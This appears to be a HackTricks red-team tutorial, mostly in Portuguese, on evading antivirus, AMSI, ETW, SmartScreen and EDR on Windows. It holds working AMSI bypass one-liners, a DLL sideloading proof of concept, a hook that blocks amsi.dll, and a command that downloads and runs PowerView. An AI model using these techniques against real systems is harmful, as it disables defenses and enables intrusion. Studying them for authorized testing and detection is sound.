# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Esta página foi escrita por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Parar o Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ferramenta para impedir que o Windows Defender funcione.
- [no-defender](https://github.com/es3n1n/no-defender): Ferramenta para impedir que o Windows Defender funcione fingindo ser outro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Atualmente, os AVs usam diferentes métodos para verificar se um arquivo é malicioso ou não: static detection, dynamic analysis e, para os EDRs mais avançados, behavioural analysis.

### **Static detection**

Static detection é feita sinalizando strings maliciosas conhecidas ou arrays de bytes em um binary ou script, e também extraindo informação do próprio arquivo (por exemplo file description, company name, digital signatures, icon, checksum, etc.). Isso significa que usar public tools conhecidas pode te pegar mais facilmente, pois provavelmente já foram analisadas e marcadas como malicious. Existem algumas maneiras de contornar esse tipo de detection:

- **Encryption**

Se você encryptar o binary, não haverá como o AV detectar seu programa, mas você precisará de algum loader para decryptar e executar o programa na memória.

- **Obfuscation**

Às vezes tudo o que você precisa fazer é mudar algumas strings no seu binary ou script para passar pelo AV, mas isso pode ser uma tarefa demorada dependendo do que você está tentando ofuscar.

- **Custom tooling**

Se você desenvolver suas próprias ferramentas, não haverá signatures conhecidas ruins, mas isso exige muito tempo e esforço.

> [!TIP]
> Uma boa forma de checar a static detection do Windows Defender é [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ele basicamente divide o arquivo em múltiplos segmentos e então instrui o Defender a escanear cada um individualmente; dessa forma, pode te dizer exatamente quais strings ou bytes estão sendo sinalizados no seu binary.

Recomendo fortemente checar esta [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre AV Evasion prática.

### **Dynamic analysis**

Dynamic analysis é quando o AV roda seu binary em um sandbox e observa atividades maliciosas (por exemplo tentar decryptar e ler as senhas do browser, realizar um minidump no LSASS, etc.). Essa parte pode ser mais complicada de contornar, mas aqui estão algumas coisas que você pode fazer para evitar sandboxes.

- **Sleep before execution** Dependendo de como está implementado, pode ser uma ótima forma de bypass da dynamic analysis dos AVs. Os AVs têm um tempo muito curto para escanear arquivos para não interromper o fluxo do usuário, então usar sleeps longos pode atrapalhar a análise de binaries. O problema é que muitos sandboxes dos AVs podem simplesmente pular o sleep dependendo de como está implementado.
- **Checking machine's resources** Normalmente sandboxes têm muito poucos recursos disponíveis (por exemplo < 2GB RAM), caso contrário poderiam deixar a máquina do usuário lenta. Você também pode ser criativo aqui, por exemplo checando a temperatura da CPU ou até a velocidade das ventoinhas — nem tudo será implementado no sandbox.
- **Machine-specific checks** Se você quer mirar um usuário cuja workstation está joined ao domínio "contoso.local", você pode checar o domain do computador para ver se bate com o especificado; se não bater, você pode fazer seu programa sair.

Acontece que o nome do computador da Sandbox do Microsoft Defender é HAL9TH, então você pode checar o nome do computador no seu malware antes da detonação; se o nome for HAL9TH, significa que você está dentro da sandbox do Defender, então pode fazer seu programa exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algumas outras dicas muito boas do [@mgeeky](https://twitter.com/mariuszbit) para enfrentar Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Como dissemos antes neste post, **public tools** eventualmente **vão ser detectadas**, então você deve se perguntar o seguinte:

Por exemplo, se você quer dumpar o LSASS, **você realmente precisa usar o mimikatz**? Ou poderia usar um projeto diferente, menos conhecido, que também dumpa o LSASS?

A resposta certa provavelmente é a segunda. Tomando o mimikatz como exemplo, ele provavelmente é um dos — se não o mais — sinalizados por AVs e EDRs; embora o projeto em si seja muito bom, também é um pesadelo trabalhar com ele para contornar AVs, então procure alternativas para o que você está tentando alcançar.

> [!TIP]
> Ao modificar seus payloads para evasion, certifique-se de **desativar o envio automático de amostras** no Defender e, por favor, sério, **NÃO UPLOAD PARA O VIRUSTOTAL** se seu objetivo é alcançar evasion a longo prazo. Se você quer checar se seu payload é detectado por um AV específico, instale-o em uma VM, tente desativar o envio automático de amostras e teste lá até você ficar satisfeito com o resultado.

## EXEs vs DLLs

Sempre que possível, priorize usar DLLs para evasion; na minha experiência, arquivos DLL costumam ser **bem menos detectados** e analisados, então é um truque simples para evitar detecção em alguns casos (se o seu payload tem alguma forma de rodar como DLL, claro).

Como podemos ver nesta imagem, um DLL Payload do Havoc tem uma taxa de detecção de 4/26 no antiscan.me, enquanto o payload EXE tem 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Agora mostraremos alguns truques que você pode usar com arquivos DLL para ser muito mais stealthy.

## DLL Sideloading & Proxying

**DLL Sideloading** explora a DLL search order usada pelo loader posicionando tanto a aplicação vítima quanto os payload(s) maliciosos lado a lado.

Você pode checar programas suscetíveis a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e o seguinte powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando exibirá a lista de programas suscetíveis a DLL hijacking dentro de "C:\Program Files\\" e os arquivos DLL que eles tentam carregar.

Recomendo fortemente que você **explore DLL Hijackable/Sideloadable programs por conta própria**; essa técnica é bastante stealthy quando bem executada, mas se você usar programas DLL Sideloadable amplamente conhecidos, pode ser pego facilmente.

Apenas colocar uma DLL maliciosa com o nome que o programa espera carregar não fará com que seu payload seja executado, pois o programa espera funções específicas nessa DLL; para corrigir esse problema, usaremos outra técnica chamada **DLL Proxying/Forwarding**.

**DLL Proxying** encaminha as chamadas que um programa faz da DLL proxy (maliciosa) para a DLL original, preservando assim a funcionalidade do programa e permitindo lidar com a execução do seu payload.

Vou usar o projeto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estes são os passos que segui:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
O último comando nos dará 2 arquivos: um modelo do código-fonte da DLL e a DLL original renomeada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nosso shellcode (codificado com [SGN](https://github.com/EgeBalci/sgn)) quanto o proxy DLL têm uma taxa de detecção 0/26 em [antiscan.me](https://antiscan.me)! Eu chamaria isso de sucesso.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Eu **recomendo fortemente** que você assista [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading e também [o vídeo do ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender mais sobre o que discutimos de forma mais aprofundada.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Key behaviors to understand:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` não é uma KnownDLL, então é resolvida pela ordem de pesquisa normal.

PoC (copiar e colar):
1) Copie a DLL de sistema assinada para uma pasta gravável
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloque um `NCRYPTPROV.dll` malicioso na mesma pasta. Um DllMain mínimo é suficiente para obter execução de código; não é necessário implementar a função encaminhada para acionar o DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Acionar o forward com um LOLBin assinado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento observado:
- rundll32 (signed) loads the side-by-side `keyiso.dll` (signed)
- Ao resolver `KeyIsoSetAuditingInterface`, o loader segue o forward para `NCRYPTPROV.SetAuditingInterface`
- O loader então carrega `NCRYPTPROV.dll` de `C:\test` e executa seu `DllMain`
- Se `SetAuditingInterface` não estiver implementado, você receberá um erro de "missing API" somente depois que o `DllMain` já tiver sido executado

Hunting tips:
- Foque em forwarded exports onde o módulo alvo não é um KnownDLL. KnownDLLs estão listados em `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Você pode enumerar forwarded exports com tooling such as:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Veja o inventário de forwarders do Windows 11 para procurar candidatos: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitore LOLBins (por exemplo, `rundll32.exe`) carregando DLLs assinadas a partir de caminhos fora das pastas do sistema, seguidas pelo carregamento de non-KnownDLLs com o mesmo nome base desse diretório
- Alerta sobre cadeias processo/módulo como: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` em caminhos graváveis pelo usuário
- Aplique políticas de integridade de código (WDAC/AppLocker) e negue write+execute em diretórios de aplicação

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Você pode usar Freeze para carregar e executar seu shellcode de maneira furtiva.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> A evasão é apenas um jogo de gato e rato; o que funciona hoje pode ser detectado amanhã, então nunca dependa de apenas uma ferramenta — quando possível, tente encadear múltiplas técnicas de evasão.

## AMSI (Anti-Malware Scan Interface)

AMSI foi criado para prevenir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, os AVs só eram capazes de escanear **arquivos no disco**, então se você conseguisse de alguma forma executar payloads **directly in-memory**, o AV não poderia fazer nada para evitar isso, pois não tinha visibilidade suficiente.

The AMSI feature is integrated into these components of Windows.

- User Account Control, ou UAC (elevação de EXE, COM, MSI, ou instalação de ActiveX)
- PowerShell (scripts, uso interativo e avaliação dinâmica de código)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- macros VBA do Office

Isso permite que soluções antivírus inspecionem o comportamento de scripts expondo o conteúdo do script em uma forma que é tanto não criptografada quanto não ofuscada.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Observe como ele antepõe `amsi:` e depois o caminho para o executável de onde o script foi executado, neste caso, powershell.exe

Não colocamos nenhum arquivo no disco, mas ainda assim fomos detectados in-memory por causa do AMSI.

Além disso, a partir do **.NET 4.8**, código C# também é executado através do AMSI. Isso afeta até `Assembly.Load(byte[])` para execução em memória. Por isso, recomenda-se usar versões mais antigas do .NET (como 4.7.2 ou inferiores) para execução in-memory se você quiser evadir o AMSI.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Como o AMSI opera principalmente com detecções estáticas, modificar os scripts que você tenta carregar pode ser uma boa forma de evadir a detecção.

No entanto, o AMSI tem a capacidade de desofuscar scripts mesmo que tenham múltiplas camadas, então a obfuscação pode ser uma má opção dependendo de como é feita. Isso torna a evasão não tão direta. Embora, às vezes, tudo que você precisa fazer é mudar um par de nomes de variáveis e você estará OK, então depende do quanto algo foi sinalizado.

- **AMSI Bypass**

Como o AMSI é implementado carregando uma DLL no processo do powershell (também cscript.exe, wscript.exe, etc.), é possível manipular isso facilmente mesmo executando como um usuário sem privilégios. Devido a essa falha na implementação do AMSI, pesquisadores encontraram múltiplas maneiras de evadir a varredura do AMSI.

**Forçar um Erro**

Forçar a inicialização do AMSI a falhar (amsiInitFailed) resultará que nenhuma varredura será iniciada para o processo atual. Originalmente isso foi divulgado por [Matt Graeber](https://twitter.com/mattifestation) e a Microsoft desenvolveu uma assinatura para prevenir uso mais amplo.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Tudo o que foi necessário foi uma linha de código powershell para tornar o AMSI inutilizável para o processo powershell atual. Essa linha, é claro, foi sinalizada pelo próprio AMSI, então alguma modificação é necessária para poder usar essa técnica.

Aqui está um AMSI bypass modificado que peguei deste [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tenha em mente que isto provavelmente será sinalizado quando este post for publicado, então você não deve publicar nenhum código se seu plano for permanecer indetectado.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Por favor leia [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para uma explicação mais detalhada.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Bloqueando AMSI impedindo o carregamento de amsi.dll (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Esboço de implementação (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Funciona em PowerShell, WScript/CScript e loaders personalizados (qualquer coisa que, de outra forma, carregaria AMSI).
- Combine com passagem de scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefatos longos na linha de comando.
- Visto sendo usado por loaders executados através de LOLBins (por exemplo, `regsvr32` chamando `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Remover a assinatura detectada**

Você pode usar uma ferramenta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para remover a assinatura AMSI detectada da memória do processo atual. Essas ferramentas funcionam escaneando a memória do processo atual em busca da assinatura AMSI e então sobrescrevendo-a com instruções NOP, removendo-a efetivamente da memória.

**Produtos AV/EDR que usam AMSI**

Você pode encontrar uma lista de produtos AV/EDR que usam AMSI em **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use PowerShell versão 2**
Se você usar PowerShell versão 2, o AMSI não será carregado, então você pode executar seus scripts sem serem escaneados pelo AMSI. Você pode fazer isto:
```bash
powershell.exe -version 2
```
## Registro do PowerShell

PowerShell logging é um recurso que permite registrar todos os comandos do PowerShell executados em um sistema. Isso pode ser útil para auditoria e solução de problemas, mas também pode ser um **problema para atacantes que querem escapar da detecção**.

Para contornar o registro do PowerShell, você pode usar as seguintes técnicas:

- **Disable PowerShell Transcription and Module Logging**: Você pode usar uma ferramenta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para esse fim.
- **Use Powershell version 2**: Se você usar PowerShell version 2, AMSI não será carregado, então você poderá executar seus scripts sem serem escaneados pelo AMSI. Você pode fazer isso: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para spawnar um powershell sem defesas (é isso que `powerpick` do Cobal Strike usa).


## Ofuscação

> [!TIP]
> Várias técnicas de ofuscação dependem de criptografar dados, o que aumentará a entropia do binário e tornará mais fácil para AVs e EDRs detectá-lo. Tenha cuidado com isso e talvez aplique criptografia apenas a seções específicas do seu código que sejam sensíveis ou que precisem ser ocultadas.

### Desofuscando binários .NET protegidos por ConfuserEx

Ao analisar malware que usa ConfuserEx 2 (ou forks comerciais) é comum enfrentar várias camadas de proteção que bloquearão descompiladores e sandboxes. O fluxo de trabalho abaixo restaura de forma confiável um IL quase original que pode ser posteriormente decompilado para C# em ferramentas como dnSpy ou ILSpy.

1.  Remoção de anti-tamper – ConfuserEx encripta cada *method body* e o descriptografa dentro do construtor estático do *module* (`<Module>.cctor`). Isso também corrige o checksum do PE de modo que qualquer modificação fará o binário falhar. Use **AntiTamperKiller** para localizar as tabelas de metadata encriptadas, recuperar as chaves XOR e reescrever um assembly limpo:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
A saída contém os 6 parâmetros anti-tamper (`key0-key3`, `nameHash`, `internKey`) que podem ser úteis ao construir seu próprio unpacker.

2.  Recuperação de símbolos / fluxo de controle – alimente o arquivo *clean* para **de4dot-cex** (um fork de de4dot com suporte a ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – seleciona o perfil ConfuserEx 2  
• de4dot desfará o control-flow flattening, restaurará namespaces, classes e nomes de variáveis originais e descriptografará strings constantes.

3.  Remoção de proxy-call – ConfuserEx substitui chamadas diretas de métodos por wrappers leves (também chamados *proxy calls*) para dificultar ainda mais a descompilação. Remova-os com **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Após esse passo você deve observar APIs .NET normais como `Convert.FromBase64String` ou `AES.Create()` em vez de funções wrapper opacas (`Class8.smethod_10`, …).

4.  Limpeza manual – execute o binário resultante no dnSpy, procure por grandes blobs Base64 ou uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar o payload *real*. Frequentemente o malware o armazena como um array de bytes codificado em TLV inicializado dentro de `<Module>.byte_0`.

A cadeia acima restaura o fluxo de execução **sem** precisar executar a amostra maliciosa – útil quando se trabalha em uma estação offline.

> 🛈  ConfuserEx produz um atributo customizado chamado `ConfusedByAttribute` que pode ser usado como um IOC para triagem automática de amostras.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): O objetivo deste projeto é fornecer um fork de código aberto da suíte de compilação [LLVM](http://www.llvm.org/) capaz de aumentar a segurança do software através de code obfuscation e tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstra como usar `C++11/14` para gerar, em tempo de compilação, código ofuscado sem usar qualquer ferramenta externa e sem modificar o compiler.
- [**obfy**](https://github.com/fritzone/obfy): Adiciona uma camada de operações obfuscated geradas pelo framework de C++ template metaprogramming que tornará a vida de quem tentar crackar a aplicação um pouco mais difícil.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz é um x64 binary obfuscator capaz de obfuscate vários tipos de pe files incluindo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame é um simples metamorphic code engine para executáveis arbitrários.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um fine-grained code obfuscation framework para linguagens suportadas pelo LLVM usando ROP (return-oriented programming). ROPfuscator obfuscates um programa no nível de assembly code transformando instruções regulares em ROP chains, frustrando nossa concepção natural de fluxo de controle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um .NET PE Crypter escrito em Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor é capaz de converter EXE/DLL existentes em shellcode e então carregá-los

## SmartScreen & MoTW

Você pode ter visto esta tela ao baixar alguns executáveis da internet e executá-los.

Microsoft Defender SmartScreen é um mecanismo de segurança destinado a proteger o usuário final contra a execução de aplicações potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funciona principalmente com uma abordagem baseada em reputation, o que significa que aplicações pouco baixadas irão disparar o SmartScreen, alertando e impedindo o usuário final de executar o arquivo (embora o arquivo ainda possa ser executado clicando em More Info -> Run anyway).

**MoTW** (Mark of The Web) é um [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) com o nome Zone.Identifier que é criado automaticamente ao baixar arquivos da internet, junto com a URL de onde foi baixado.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from the internet.</p></figcaption></figure>

> [!TIP]
> É importante notar que executáveis assinados com um **trusted** signing certificate **won't trigger SmartScreen**.

Uma forma muito eficaz de prevenir que seus payloads recebam o Mark of The Web é empacotá-los dentro de algum tipo de container como um ISO. Isso acontece porque Mark-of-the-Web (MOTW) **cannot** ser aplicado a volumes **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em containers de saída para evadir o Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) é um mecanismo poderoso de logging no Windows que permite que aplicações e componentes do sistema **registrem eventos**. No entanto, também pode ser usado por produtos de segurança para monitorar e detectar atividades maliciosas.

Similar ao modo como o AMSI é desativado (bypassed), também é possível fazer com que a função **`EtwEventWrite`** do processo em espaço de usuário retorne imediatamente sem registrar nenhum evento. Isso é feito patchando a função na memória para retornar imediatamente, efetivamente desativando o logging do ETW para esse processo.

Você pode encontrar mais informações em **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory é conhecido há bastante tempo e continua sendo uma ótima forma de rodar suas ferramentas de post-exploitation sem ser detectado pelo AV.

Como o payload será carregado diretamente na memória sem tocar no disco, só teremos que nos preocupar em patchar o AMSI para todo o processo.

A maioria dos frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) já fornece a capacidade de executar C# assemblies diretamente na memória, mas existem formas diferentes de fazer isso:

- **Fork\&Run**

Envolve **spawnar um novo processo sacrificial**, injetar seu código malicioso de post-exploitation nesse novo processo, executar seu código malicioso e, quando terminar, matar o processo. Isso tem vantagens e desvantagens. A vantagem do método fork and run é que a execução ocorre **fora** do nosso processo Beacon implantado. Isso significa que se algo na nossa ação de post-exploitation falhar ou for detectado, há uma **chance muito maior** de nosso **implant** sobreviver. A desvantagem é que você tem uma **maior probabilidade** de ser detectado por **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Trata-se de injetar o código malicioso de post-exploitation **no próprio processo**. Dessa forma, você evita criar um novo processo que poderia ser escaneado pelo AV, mas a desvantagem é que, se algo der errado na execução do seu payload, há uma **chance muito maior** de **perder seu beacon**, pois ele pode travar.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se quiser ler mais sobre C# Assembly loading, confira este artigo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e o InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Você também pode carregar C# Assemblies **a partir do PowerShell**, veja [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e o vídeo do S3cur3th1sSh1t ([https://www.youtube.com/watch?v=oe11Q-3Akuk](https://www.youtube.com/watch?v=oe11Q-3Akuk)).

## Using Other Programming Languages

Como proposto em [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), é possível executar código malicioso usando outras linguagens dando à máquina comprometida acesso **ao ambiente do interpretador instalado no Attacker Controlled SMB share**.

Ao permitir acesso aos Interpreter Binaries e ao ambiente no SMB share você pode **executar código arbitrário nessas linguagens dentro da memória** da máquina comprometida.

O repo indica: o Defender ainda escaneia os scripts, mas utilizando Go, Java, PHP etc temos **mais flexibilidade para burlar assinaturas estáticas**. Testes com shells reversos aleatórios e não ofuscados nessas linguagens mostraram-se bem-sucedidos.

## TokenStomping

Token stomping é uma técnica que permite a um atacante **manipular o access token ou um produto de segurança como um EDR ou AV**, permitindo reduzir privilégios de modo que o processo não morra mas também não tenha permissões para verificar atividades maliciosas.

Para prevenir isso, o Windows poderia **impedir processos externos** de obter handles dos tokens de processos de segurança.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
